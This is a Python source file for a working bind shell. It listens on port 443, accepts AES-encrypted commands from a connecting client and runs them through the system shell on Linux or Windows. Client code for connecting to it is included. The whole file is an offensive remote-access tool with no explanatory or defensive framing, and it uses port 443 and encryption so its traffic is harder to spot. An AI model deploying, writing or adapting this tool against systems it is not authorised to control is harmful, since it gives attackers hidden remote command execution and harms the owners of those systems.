import sys
import socket
import argparse
import platform
import threading
import subprocess

from aes_pycryptodome import AESCipher

DEFAULT_PORT = 443
MAX_BUFFER = 4096

class BindShell:
    def __init__(self):
        self.aes = AESCipher()

    def encrypted_send(self, s, msg):
        """Send an AES-encrypted message."""

        encrypted = self.aes.encrypt(msg)
        s.send(encrypted.encode('latin-1'))

    def execute_cmd(self, cmd):
        """Execute a Linux/Windows command."""

        if platform.system() == 'Linux':
            try:
                output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
            except:
                output = b'Command failed.'
        elif platform.system() == 'Windows':
            try:
                output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
            except:
                output = b'Command failed.'
        else:
            print('The system must be Linux or Windows. Terminating...')
            sys.exit()
        
        return output

    def decode_and_strip(self, s):
        """Decode and strip the string."""
        return s.decode('latin-1').strip()

    def cleanup(self, s):
        """Close the socket and exit the program."""
        s.close()
        sys.exit()

    def shell_thread(self, s):
        """Multithreading interactive shell sesion."""
        if platform.system() == 'Linux':
            self.encrypted_send(s, b"[ -- Connected -- ]\n")
        elif platform.system() == 'Windows':
            self.encrypted_send(s, b"[ -- Connected -- ]\r\n")
        else:
            print('The system must be Linux or Windows. Terminating...')
            sys.exit()

        try:
            while True:
                if platform.system() == 'Linux':
                    self.encrypted_send(s, b"\nEnter command>")
                elif platform.system() == 'Windows':
                    self.encrypted_send(s, b"\r\nEnter command>")
                else:
                    print('The system must be Linux or Windows. Terminating...')
                    sys.exit()

                data = s.recv(MAX_BUFFER)
                if data:
                    buffer = self.aes.decrypt(self.decode_and_strip(data))
                    buffer = self.decode_and_strip(buffer)

                    if not buffer or buffer == 'exit':
                        self.cleanup(s)

                    print(f"> Executing command: '{buffer}'")
                    self.encrypted_send(s, self.execute_cmd(buffer))
        except:
            print("shell_thread error. Terminating...")
            self.cleanup(s)

    def send_thread(self, s):
        """Multithreading send()."""
        try:
            while True:
                data = input() + '\n'
                self.encrypted_send(s, data.encode('latin-1'))
        except:
            print('send_thread error. Terminating...')
            self.cleanup(s)

    def recv_thread(self, s):
        """Multithreading recv()."""
        try:
            while True:
                data = self.decode_and_strip(s.recv(MAX_BUFFER))

                if data:
                    data = self.aes.decrypt(data).decode('latin-1')
                    print(data, end='', flush=True)
        except:
            print('recv_thread error. Terminating...')
            self.cleanup(s)

    def server(self):
        """Socket server."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', DEFAULT_PORT))
        s.listen()

        print('[ -- Starting Bind Shell -- ]')
        while True:
            client_socket, addr = s.accept()
            print('[ -- New User Connected -- ]')
            threading.Thread(target=self.shell_thread, args=(client_socket,)).start()

    def client(self, ip):
        """Socket client."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, DEFAULT_PORT))

        print('[ -- Connecting to Bind Shell -- ]')
        threading.Thread(target=self.send_thread, args=(s,)).start()
        threading.Thread(target=self.recv_thread, args=(s,)).start()

    def run(self):
        parser = argparse.ArgumentParser()

        # Usage: python3 bind_shell.py -l
        # This is similar to nc -nvlp 1337
        parser.add_argument(
            '-l',
            '--listen',
            action='store_true',
            help='Setup a bind shell',
            required=False,
        )
        # Usage: python3 bind_shell.py -c 127.0.0.1
        # This is similar to nc 127.0.0.1 1337 with a random key
        parser.add_argument(
            '-c',
            '--connect',
            help='Connect to a bind shell',
            required=False,
        )

        args = parser.parse_args()

        if args.listen:
            self.server()
        elif args.connect:
            self.client(args.connect)

if __name__ == '__main__':
    bind_shell = BindShell()
    bind_shell.run()
